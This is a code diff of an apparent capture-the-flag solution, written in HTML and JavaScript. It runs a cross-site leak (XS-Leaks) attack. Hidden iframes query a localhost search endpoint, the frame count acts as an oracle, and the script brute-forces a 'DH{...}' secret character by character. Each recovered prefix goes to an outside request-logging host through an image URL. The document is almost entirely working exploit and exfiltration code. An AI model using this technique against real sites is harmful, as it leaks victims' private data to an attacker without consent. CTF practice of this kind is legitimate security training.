@@ -1,41 +1,54 @@
-<iframe id="iframe"></iframe>
 <img id="img">
 <script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
-                    return resolve();
-                else
-                    return reject();
+    async function search(query) {
+        return new Promise((resolve) => {
+            const iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src = `http://localhost:8000/search?query=${query}`;
+            document.body.appendChild(iframe);
+
+            iframe.onload = () => {
+                let result;
+                try {
+                    result = iframe.contentWindow.frames.length;
+                } catch (e) {
+                    result = 0;
+                }
+                document.body.removeChild(iframe);
+                resolve(result != 0);
             };
+
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                resolve(false);
+            }, 3000);
         });
     }
 
-    async function search(query) {
-        try {
-            await req(
-              `http://localhost:8000/search?query=${query}`
-            );
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
     async function exploit() {
-        let chars = "0123456789abcdef}"
+        let chars = "0123456789abcdef}";
         let secret = "DH{";
+        const img = document.getElementById("img");
 
         while (!secret.includes("}")) {
-            for (let c of chars) {
-                if (await search(secret + c)) {
-                    secret += c;
+            let found = false;
+            let promises = chars.split("").map(c => 
+                search(secret + c).then(result => ({char:c, success:result}))
+            );
+            let results = await Promise.all(promises);
+
+            for (let rslt of results) {
+                if (rslt.success) {
+                    secret += rslt.char;
+                    found = true;
                     img.src = `https://btvqydh.request.dreamhack.games/${secret}`;
                     break;
                 }
+            }
+
+            if (!found) {
+                img.src = `https://btvqydh.request.dreamhack.games/failed`;
+                break;
             }
         }
     }
